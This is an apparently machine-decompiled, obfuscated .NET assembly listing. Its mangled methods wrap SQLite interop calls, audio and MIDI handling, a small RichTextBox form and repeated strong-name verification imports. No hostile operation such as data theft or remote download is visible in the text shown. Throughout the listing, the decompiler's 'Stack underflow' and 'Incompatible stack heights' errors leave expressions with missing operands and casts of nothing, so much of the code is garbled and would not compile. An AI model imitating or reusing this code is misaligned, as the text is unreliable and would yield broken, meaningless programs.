			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			_0018._0001((string)/*Error near IL_0017: Stack underflow*/);
			_0018._0001((_0080._0017)/*Error near IL_000b: Stack underflow*/, (byte[])/*Error near IL_000b: Stack underflow*/);
		}

		static void _0001(global::_0007._0014 _0002, global::_0003._000F _0003, global::_0005._0012 _0004, long _0005, long _0006, global::_0005._0005 _0007, Guid P_6)
		{
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 2
			((global::_0007._0014)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0003._000F)/*Error near IL_0009: Stack underflow*/;
			_ = global::_0007._0097;
			int num = ((global::_0007._0014)/*Error near IL_0015: Stack underflow*/)._0001._0001(_0003, _0004, _0005, _0006, _0007, ref P_6);
			/*Error near IL_0028: Stack underflow*/(num);
			_0002._0001 = null;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static AsioError _0001(global::_0017._0015 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_0021: Incompatible stack heights: 0 vs 1
			_ = ((global::_0017._0015)/*Error near IL_0007: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0013: Stack underflow*/)._0001;
			/*Error near IL_0021: Stack underflow*/(pUnknown);
			return (AsioError)/*Error near IL_0016: Stack underflow*/;
		}

		static int _0001(int _0002, _001F._0019 P_1)
		{
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_009a: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_00a4: Stack underflow*/, (int)/*Error near IL_00a4: Stack underflow*/);
			if (P_1._0001[_0002]._0001 != null)
			{
				return _0004_0005._007E_008D_000E(P_1._0001[_0002]._0001._0001, P_1._0001[_0002]._0004);
			}
			long num = P_1._0001._0001._0002(P_1._0001, P_1._0001[_0002]._0003);
			if (num == 0)
			{
				throw new InvalidCastException();
			}
			return global::_0018._0007_0003(num);
		}

		static global::_0002._0002 _0001(global::_0002._0002 P_0)
		{
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Invalid comparison between Unknown and I8
			//IL_003d: Incompatible stack heights: 0 vs 3
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_004b: Incompatible stack heights: 0 vs 1
			_ = global::_0012._007E_0091_0002;
			_ = _0005_0003._007E_0082_0006;
			BinaryReader binaryReader = ((global::_0002._0002)/*Error near IL_0011: Stack underflow*/)._0001;
			/*Error near IL_0044: Stack underflow*/(binaryReader);
			/*Error near IL_004b: Stack underflow*/((object)/*Error near IL_004b: Stack underflow*/);
			if ((long)(/*Error near IL_0018: Stack underflow*/ + 8) < P_0._0001 + P_0._0001)
			{
				global::_0002._0002 obj = new global::_0002._0002(P_0._0001);
				_0018._0001(obj);
				return obj;
			}
			return null;
		}

		[DllImport("winmm.dll", EntryPoint = "midiStreamProperty")]
		static extern MmResult _0001(IntPtr _0002, IntPtr _0003, int _0004);

		static bool _0001(string _0002, _0016 _0003, global::_0013._0017 P_2)
		{
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00bb: Incompatible stack heights: 0 vs 2
			if (((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001 == null)
			{
				return false;
			}
			int num = 0;
			_ = global::_001A._007E_0016_0003;
			if (/*Error near IL_0023: Stack underflow*/((object)/*Error near IL_0023: Stack underflow*/) > 0 && _0086_0002._007E_008E_0005(_0080._0014._0001(107377820), _009F_0004._007E_0088_000E(_0002, 0)) == -1)
			{
				num = 1;
			}
			int num2 = P_2._0001.Length;
			for (int i = 0; i < num2; i++)
			{
				if (_0096_0003._0095_0007(P_2._0001[i], num, _0002, 0, _0016_0002._0019_0005(global::_001A._007E_0016_0003(P_2._0001[i]) - num, global::_001A._007E_0016_0003(_0002)), StringComparison.OrdinalIgnoreCase) == 0)
				{
					P_2._0001[i] = _0003;
					return true;
				}
			}
			return false;
		}

		static float[] _0001(int _0002, float[] _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				_ = ((Array)/*Error near IL_0007: Stack underflow*/).Length;
				if (/*Error near IL_000c: Stack underflow*/ >= /*Error near IL_000c: Stack underflow*/)
				{
					goto IL_0014;
				}
			}
			_0003 = new float[_0002];
			goto IL_0014;
			IL_0014:
			return _0003;
		}

		static bool _0001(_0013 _0002, SQLiteConnectionFlags _0003, bool _0004)
		{
			//IL_00f7: Incompatible stack heights: 0 vs 1
			//IL_00fd: Incompatible stack heights: 0 vs 1
			//IL_0107: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				return false;
			}
			_ = ((_0013)/*Error near IL_0107: Stack underflow*/).Functions;
			IDictionary<_0019._007F, global::_0012._0014> dictionary = (IDictionary<_0019._007F, global::_0012._0014>)/*Error near IL_0014: Stack underflow*/;
			if (dictionary == null)
			{
				return false;
			}
			bool result = true;
			if (_0004)
			{
				IEnumerator<KeyValuePair<_0019._007F, object>> enumerator = global::_0012._0014._0001.GetEnumerator();
				try
				{
					while (global::_001B._007E_0086_0003(enumerator))
					{
						_0019._007F key = enumerator.Current.Key;
						if (key != null && (!dictionary.TryGetValue(key, out var value) || value == null || !_0018._0001(key, _0002, _0003, value)))
						{
							result = false;
						}
					}
					return result;
				}
				finally
				{
					if (enumerator != null)
					{
						global::_0008._007E_0098(enumerator);
					}
				}
			}
			dictionary = new Dictionary<_0019._007F, global::_0012._0014>(dictionary);
			IEnumerator<KeyValuePair<_0019._007F, global::_0012._0014>> enumerator2 = dictionary.GetEnumerator();
			try
			{
				while (global::_001B._007E_0086_0003(enumerator2))
				{
					KeyValuePair<_0019._007F, global::_0012._0014> current = enumerator2.Current;
					_0019._007F key2 = current.Key;
					if (key2 != null)
					{
						global::_0012._0014 value2 = current.Value;
						if (value2 != null && _0018._0001(key2, _0002, _0003, value2))
						{
							_0002.Functions.Remove(key2);
						}
						else
						{
							result = false;
						}
					}
				}
				return result;
			}
			finally
			{
				if (enumerator2 != null)
				{
					global::_0008._007E_0098(enumerator2);
				}
			}
		}

		static Delegate _0001(MulticastDelegate _0002)
		{
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 2
			//IL_0041: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				_ = _0099_0006._007E_008E_0010;
				/*Error near IL_0041: Stack underflow*/((object)/*Error near IL_0041: Stack underflow*/);
				Delegate[] array = (Delegate[])/*Error near IL_000e: Stack underflow*/;
				for (int i = 0; i < array.Length; i++)
				{
					if (_0083_0003._007E_001E_0007(array[i]) is DbCommandBuilder)
					{
						return array[i];
					}
				}
			}
			return null;
		}

		static _0080._0017 _0001(int _0002, global::_0017._0080 P_1)
		{
			//IL_0072: Incompatible stack heights: 0 vs 1
			//IL_0082: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_007c: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000e: Stack underflow*/)._0001 != ConnectionState.Open)
			{
				throw new InvalidOperationException(_0080._0014._0001(107377811));
			}
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				intPtr = _0099._008C_0004(4);
				_009A_0005._008C_000F(intPtr, 0, _0002);
				return P_1._0001._0001(null, 6, intPtr);
			}
			finally
			{
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					_009B._0090_0004(intPtr);
				}
			}
		}

		static int _0001(int _0002, int _0003)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected I4, but got Unknown
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0012: Expected I4, but got Unknown
			//IL_0015: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0004: Stack underflow*/- 1;
			return (/*Error near IL_000a: Stack underflow*/ + num) & ~num;
		}

		static void _0001(bool _0002, global::_0004._0016 P_1)
		{
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 1
			if (((global::_0004._0016)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				return;
			}
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				if (((global::_0004._0016)/*Error near IL_0014: Stack underflow*/)._0001 != null)
				{
					global::_0008._007E_0007_0002(P_1._0001);
					P_1._0001 = null;
				}
				P_1._0001 = null;
			}
			P_1._0001 = true;
		}

		static void _0001(global::_0016._0012 P_0)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0016._0012)/*Error near IL_0007: Stack underflow*/)._0001);
		}

		static void _0001(_0019._0011 P_0)
		{
			//IL_013e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0170: Incompatible stack heights: 0 vs 1
			//IL_0175: Unknown result type (might be due to invalid IL or missing references)
			//IL_017a: Incompatible stack heights: 0 vs 1
			//IL_0180: Incompatible stack heights: 0 vs 2
			new RichTextBox();
			((_0019._0011)/*Error near IL_000f: Stack underflow*/)._0001 = (RichTextBox)/*Error near IL_000f: Stack underflow*/;
			_ = global::_0008._0017_0002;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			_009A_0006._007E_008F_0010(P_0._0001, (BorderStyle)0);
			_009B_0006._007E_0090_0010(P_0._0001, (DockStyle)5);
			_009C_0006._007E_0091_0010(P_0._0001, new Point(1, 1));
			_0082_0003._007E_0013_0007(P_0._0001, _0080._0014._0001(107377702));
			global::_0005._007E_0093(P_0._0001, true);
			_008C_0005._007E_001B_000F(P_0._0001, new Size(311, 129));
			_009D_0002._007E_0019_0006(P_0._0001, 0);
			_0082_0003._007E_0014_0007(P_0._0001, _0080._0014._0001(107396634));
			_0092_0005._0081_000F(P_0, new SizeF(6f, 13f));
			_0093_0005._0082_000F(P_0, (AutoScaleMode)1);
			_0081_0003._007E_0006_0007(P_0, _0001_0002._0098_0004());
			_009E_0006._007E_0093_0010(_009D_0006._0092_0010(P_0), (Control)(object)P_0._0001);
			_0082_0003._0013_0007(P_0, _0080._0014._0001(107377713));
			_009F_0006._0094_0010(P_0, new Padding(1));
			_008C_0005._001B_000F(P_0, new Size(313, 131));
			global::_0005._0092(P_0, false);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		unsafe static void _0001(global::_0001._0010 _0002, byte[] P_1)
		{
			//IL_009e: Incompatible stack heights: 0 vs 3
			//IL_00a8: Incompatible stack heights: 0 vs 1
			//IL_00ae: Incompatible stack heights: 0 vs 2
			global::_0018._0012._0007 obj = default(global::_0018._0012._0007);
			_ = ref obj;
			_ = _0099._008C_0004;
			IntPtr intPtr = (nint)((Array)/*Error near IL_0015: Stack underflow*/).LongLength;
			/*Error near IL_00a8: Stack underflow*/((int)(nint)intPtr);
			((global::_0018._0012._0007*)(nint)/*Error near IL_0020: Stack underflow*/)->_0001 = (IntPtr)/*Error near IL_0020: Stack underflow*/;
			_ = _0088_0005._0017_000F;
			IntPtr intPtr2 = obj._0001;
			IntPtr intPtr3 = (nint)P_1.LongLength;
			/*Error near IL_0039: Stack underflow*/((byte[])/*Error near IL_0039: Stack underflow*/, 0, intPtr2, (int)(nint)intPtr3);
			obj._0001 = P_1.Length;
			obj._0002 = P_1.Length;
			int num = _0098._0089_0004(obj);
			_0018._0001(_0002._0001, ref obj, num);
			if (_0018._0001(_0002._0001, ref obj, num) != 0)
			{
				_0018._0001(_0002._0001, ref obj, num);
			}
			_009B._0090_0004(obj._0001);
		}

		static string _0001(int _0002)
		{
			//IL_0040: Incompatible stack heights: 0 vs 2
			object obj = _0080._0014._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0047: Stack underflow*/((object)/*Error near IL_0047: Stack underflow*/);
			try
			{
				_0080._0014._0001.TryGetValue(_0002, out var value);
				if (value != null)
				{
					return value;
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			return _0018._0001(_0002);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_extended_result_codes")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003);

		static void _0001(global::_0001._0082 _0002, global::_0017._0080 P_1)
		{
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_005d: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107377664));
			}
			if ((P_1._0003 & SQLiteConnectionFlags.NoCreateModule) == SQLiteConnectionFlags.NoCreateModule)
			{
				throw new SQLiteException(_0080._0014._0001(107378139));
			}
			P_1._0001._0001(_0002, P_1._0003);
		}

		static int _0001(IntPtr _0002, int _0003)
		{
			//IL_0035: Incompatible stack heights: 0 vs 2
			//IL_003c: Incompatible stack heights: 0 vs 1
			int i = 0;
			_ = _0090_0002._0099_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_003c: Stack underflow*/((IntPtr)/*Error near IL_003c: Stack underflow*/, zero);
			if ((int)/*Error near IL_0013: Stack underflow*/ != 0 && _0003 > 0)
			{
				for (; _0001_0007._0095_0010(_0002, i) != 0 && i < _0003; i++)
				{
				}
			}
			return i;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_changes")]
		static extern int _0001(IntPtr _0002);

		static void _0001(global::_0017._0011 P_0)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 2
			List<global::_0002._0007> list = ((global::_0017._0011)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			try
			{
				P_0._0001.Clear();
			}
			finally
			{
				_0091_0002._009D_0005(list);
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_progress_handler")]
		static extern void _0001(IntPtr _0002, int _0003, _0019._001C _0004, IntPtr _0005);

		static void _0001(global::_0006._0010 P_0)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			((global::_0006._0010)/*Error near IL_0007: Stack underflow*/)._0001._0001 = true;
		}

		unsafe static void _0001(IntPtr _0002, int _0003, global::_0017._0015 _0004, ref global::_0010._000E _0005, int P_4)
		{
			//IL_0072: Incompatible stack heights: 0 vs 1
			//IL_0075: Incompatible stack heights: 0 vs 3
			//IL_007c: Incompatible stack heights: 0 vs 1
			_ = _0099._008C_0004;
			_ = _0098._0089_0004;
			object obj = *(global::_0010._000E*)(nint)/*Error near IL_000f: Stack underflow*/;
			/*Error near IL_007c: Stack underflow*/(obj);
			IntPtr intPtr = /*Error near IL_001f: Stack underflow*/((int)/*Error near IL_001f: Stack underflow*/);
			((global::_0017._0015)/*Error near IL_0024: Stack underflow*/)._0002 = intPtr;
			_009A._008F_0004(_0005, _0004._0002, false);
			_0018._0001(_0004, _0004._0001._0001(_0004._0001, _0002, P_4, _0003, _0004._0002), _0080._0014._0001(107378026));
		}

		static string _0001(int _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 2
			_ = global::_0007._0012._0001;
			return (string)((object[])/*Error near IL_0008: Stack underflow*/)[/*Error near IL_0008: Stack underflow*/];
		}

		static void _0001(_007F._0013 P_0)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0028: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_002f: Expected F8, but got Unknown
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 4
			//IL_003c: Incompatible stack heights: 0 vs 2
			_ = global::_0015._009E_0002;
			_ = -1.0;
			_ = 0.001;
			double num = ((_007F._0013)/*Error near IL_0020: Stack underflow*/)._0002;
			_ = /*Error near IL_0021: Stack underflow*/* num;
			double num2 = ((_007F._0013)/*Error near IL_0028: Stack underflow*/)._0001;
			_003F val = /*Error near IL_0029: Stack underflow*/* num2;
			_003F val2 = /*Error near IL_002a: Stack underflow*// val;
			double num3 = /*Error near IL_002f: Stack underflow*/((double)val2);
			((_007F._0013)/*Error near IL_0034: Stack underflow*/)._0003 = num3;
		}

		static IntPtr _0001(global::_0005._0005 _0002)
		{
			//IL_0021: Incompatible stack heights: 0 vs 3
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			_ = _0099._008C_0004;
			_ = _0098._0089_0004;
			/*Error near IL_0028: Stack underflow*/((object)/*Error near IL_0028: Stack underflow*/);
			/*Error near IL_002f: Stack underflow*/((int)/*Error near IL_002f: Stack underflow*/);
			IntPtr intPtr = (IntPtr)/*Error near IL_0011: Stack underflow*/;
			_009A._008F_0004(_0002, intPtr, false);
			return intPtr;
		}

		static void _0001(_001E._0004 P_0)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0019: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			((_001E._0004)/*Error near IL_000c: Stack underflow*/)._0001._0003();
			/*Error near IL_0020: Stack underflow*/((int)/*Error near IL_0020: Stack underflow*/);
		}

		static System.Data.IsolationLevel _0001(System.Data.IsolationLevel _0002, bool _0003, _001F._001A _0004, global::_0017._0080 _0005, Transaction _0006, bool P_5)
		{
			//IL_00c3: Incompatible stack heights: 0 vs 2
			//IL_00cd: Incompatible stack heights: 0 vs 1
			//IL_00d3: Incompatible stack heights: 0 vs 1
			_ = _0017_0004._0081_0008;
			/*Error near IL_00cd: Stack underflow*/((Transaction)/*Error near IL_00cd: Stack underflow*/, null);
			if ((int)/*Error near IL_0012: Stack underflow*/ != 0)
			{
				if ((int)/*Error near IL_0019: Stack underflow*/ != 0)
				{
					return _0005._0004;
				}
				if (P_5)
				{
					throw new InvalidOperationException(_0080._0014._0001(107378037));
				}
				return _0002;
			}
			System.Transactions.IsolationLevel isolationLevel = _0002_0007._007E_0096_0010(_0006);
			switch (isolationLevel)
			{
			case System.Transactions.IsolationLevel.Unspecified:
				return System.Data.IsolationLevel.Unspecified;
			case System.Transactions.IsolationLevel.Chaos:
				return System.Data.IsolationLevel.Chaos;
			case System.Transactions.IsolationLevel.ReadUncommitted:
				return System.Data.IsolationLevel.ReadUncommitted;
			case System.Transactions.IsolationLevel.ReadCommitted:
				return System.Data.IsolationLevel.ReadCommitted;
			case System.Transactions.IsolationLevel.RepeatableRead:
				return System.Data.IsolationLevel.RepeatableRead;
			case System.Transactions.IsolationLevel.Serializable:
				return System.Data.IsolationLevel.Serializable;
			case System.Transactions.IsolationLevel.Snapshot:
				return System.Data.IsolationLevel.Snapshot;
			default:
				if (_0003)
				{
					throw new InvalidOperationException(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107377964), new object[1] { isolationLevel }));
				}
				return _0002;
			}
		}

		static byte[] _0001(byte[] _0002)
		{
			//IL_0009: Incompatible stack heights: 0 vs 2
			//IL_0010: Incompatible stack heights: 0 vs 1
			_ = 1;
			_0018._0001((int)/*Error near IL_0010: Stack underflow*/, (byte[])/*Error near IL_0010: Stack underflow*/, (byte[])null, (byte[])null);
			return (byte[])/*Error near IL_0008: Stack underflow*/;
		}

		static _0080._0017 _0001(bool _0002)
		{
			//IL_0011: Incompatible stack heights: 0 vs 2
			//IL_0018: Incompatible stack heights: 0 vs 1
			_ = 9;
			_0018._0001(_0003: ((int)/*Error near IL_0006: Stack underflow*/ != 0) ? 1 : 0, _0002: (global::_0016._001B)/*Error near IL_0018: Stack underflow*/);
			return (_0080._0017)/*Error near IL_000e: Stack underflow*/;
		}

		static object _0001(global::_0010._001C _0002, CommandBehavior P_1)
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected I4, but got Unknown
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0010._001C)/*Error near IL_0058: Stack underflow*/);
			_0014 obj = _0018._0001((CommandBehavior)(/*Error near IL_0008: Stack underflow*/ | 8 | 1), _0002);
			try
			{
				if (global::_001B._007E_008F_0003(obj) && global::_001A._007E_001C_0003(obj) > 0)
				{
					return _008F_0004._007E_0016_000E(obj, 0);
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
			return null;
		}

		static int _0001(int _0002, global::_000E._0008 P_1)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Unknown result type (might be due to invalid IL or missing references)
			//IL_0025: Expected I4, but got Unknown
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 3
			int num = ((global::_000E._0008)/*Error near IL_0009: Stack underflow*/)._0001._0002 / 1000;
			_ = /*Error near IL_0015: Stack underflow*/* num;
			int num2 = ((global::_000E._0008)/*Error near IL_001d: Stack underflow*/)._0001.BlockAlign;
			_003F val = /*Error near IL_0023: Stack underflow*/% num2;
			return /*Error near IL_0024: Stack underflow*/- val;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_bind_double")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003, double _0004);

		static void _0001(_001A._0005 _0002, float P_1)
		{
			//IL_002c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0135: Incompatible stack heights: 0 vs 1
			//IL_013b: Incompatible stack heights: 0 vs 2
			//IL_0141: Incompatible stack heights: 0 vs 3
			if (((_001A._0005)/*Error near IL_000a: Stack underflow*/)._0001._0003 == 16)
			{
				_ = _008F_0002._007E_0098_0005;
				_ = ((_001A._0005)/*Error near IL_0022: Stack underflow*/)._0001;
				_ = 32767f;
				_003F val = /*Error near IL_002d: Stack underflow*/* /*Error near IL_002d: Stack underflow*/;
				/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, (short)val);
				_0002._0003 += 2L;
			}
			else if (_0002._0001._0003 == 24)
			{
				byte[] array = _0012_0003._008E_0006((int)(2.1474836E+09f * P_1));
				_0002._0001[0] = array[1];
				_0002._0001[1] = array[2];
				_0002._0001[2] = array[3];
				_009F_0002._007E_001C_0006(_0002._0001, _0002._0001);
				_0002._0003 += 3L;
			}
			else if (_0002._0001._0003 == 32 && _0002._0001._0001 == WaveFormatEncoding.Extensible)
			{
				_009D_0002._007E_0016_0006(_0002._0001, 65535 * (int)P_1);
				_0002._0003 += 4L;
			}
			else
			{
				if (_0002._0001._0001 != WaveFormatEncoding.IeeeFloat)
				{
					throw new InvalidOperationException(_0080._0014._0001(107355392));
				}
				_0094_0006._007E_0089_0010(_0002._0001, P_1);
				_0002._0003 += 4L;
			}
		}

		static void _0001(global::_000E._001F _0002, IntPtr _0003)
		{
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 2
			//IL_0051: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return;
			}
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0051: Stack underflow*/((IntPtr)/*Error near IL_0051: Stack underflow*/, zero);
			if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
			{
				return;
			}
			try
			{
			}
			finally
			{
				global::_000E._001F obj;
				_0091_0002._009C_0005(obj = _0002);
				try
				{
					_0080._0017 obj2 = _0018._0001(_0003);
					if (obj2 != 0)
					{
						throw new SQLiteException(obj2, null);
					}
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static bool _0001(global::_0013._0010 _0002)
		{
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				if (((global::_0013._0010)/*Error near IL_000b: Stack underflow*/)._0001 == MidiCommandCode.NoteOn)
				{
					return ((global::_0013._0011)/*Error near IL_0015: Stack underflow*/)._0002 == 0;
				}
				return _0002._0001 == MidiCommandCode.NoteOff;
			}
			return false;
		}

		static int _0001(int _0002)
		{
			//IL_002d: Incompatible stack heights: 0 vs 2
			//IL_0034: Incompatible stack heights: 0 vs 1
			int result = -1;
			_ = _0099._008E_0004;
			/*Error near IL_0034: Stack underflow*/((int)/*Error near IL_0034: Stack underflow*/);
			_0018._0001(_0018._0001((IntPtr)/*Error near IL_0018: Stack underflow*/, out result, _001D._0001._0006), _0080._0014._0001(107377951));
			return result;
		}

		static void _0001(global::_0004._0001 P_0)
		{
			//IL_00aa: Incompatible stack heights: 0 vs 1
			//IL_00b4: Incompatible stack heights: 0 vs 3
			//IL_00be: Incompatible stack heights: 0 vs 3
			try
			{
				_000E_0005._0094_000E(global::_0015._0001._0016);
				if (((Array)/*Error near IL_0012: Stack underflow*/).Length == 0)
				{
					_ = global::_001C._0097_0003;
					_ = global::_0011._008E_0002;
					_0018._0001();
					_ = global::_0015._0001._0016;
					_ = global::_000E._008A_0002;
					_0080._0014._0001(107362099);
					char[] obj = new char[1] { '!' };
					string obj2 = /*Error near IL_0047: Stack underflow*/((object)/*Error near IL_0047: Stack underflow*/, obj)[0];
					string text = /*Error near IL_004e: Stack underflow*/((string)/*Error near IL_004e: Stack underflow*/, (string)/*Error near IL_004e: Stack underflow*/, obj2);
					if (/*Error near IL_0053: Stack underflow*/(text))
					{
						_0018._0001(P_0, global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0016, global::_0002._007E_0006(global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])));
					}
				}
			}
			catch
			{
			}
		}

		static void _0001(_0019._007F _0002, global::_0017._0080 _0003, global::_0012._0014 P_2)
		{
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0039: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107377390));
			}
			_0003._0001._0001(_0002, P_2, _0003._0003);
		}

		static global::_0005._0005 _0001(global::_0005._0005 _0002)
		{
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 3
			//IL_004b: Incompatible stack heights: 0 vs 1
			_ = ((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = 16;
			new global::_0005._0005(_008F_008F_0006: ((global::_0005._0005)/*Error near IL_0010: Stack underflow*/)._0001, _0005_0080: (int)/*Error near IL_004b: Stack underflow*/, _001A_009C_0002: (int)/*Error near IL_004b: Stack underflow*/);
			global::_0005._0005 obj = (global::_0005._0005)/*Error near IL_0013: Stack underflow*/;
			_0018._0001(_0018._0001(IntPtr.Zero, _0002, obj, _0098._0089_0004(obj), global::_0005._000F._0001), _0080._0014._0001(107377317));
			return obj;
		}

		static void _0001(int _0002, global::_0006._0003 _0003, int _0004, _001C._0004 P_3)
		{
			//IL_0155: Incompatible stack heights: 0 vs 1
			//IL_015f: Incompatible stack heights: 0 vs 1
			//IL_0169: Incompatible stack heights: 0 vs 1
			if (((global::_0006._0003)/*Error near IL_000a: Stack underflow*/)._0001)
			{
				_0080._0014._0001(107377292);
				new InvalidOperationException((string?)/*Error near IL_0169: Stack underflow*/);
				throw /*Error near IL_001c: Stack underflow*/;
			}
			_0003._0001 = true;
			int num = P_3?.WaveFormat._0001 ?? _0002;
			if (P_3 != null)
			{
				_0003._0001 = P_3;
				_0003.NumberOfOutputChannels = P_3.WaveFormat._0001;
				_0003._0001 = _0018._0001(P_3.WaveFormat, _0003._0001._0001._0002[0]._0001);
			}
			else
			{
				_0003.NumberOfOutputChannels = 0;
			}
			if (!_0018._0001(_0003._0001, (double)num))
			{
				throw new ArgumentException(_0080._0014._0001(107377191));
			}
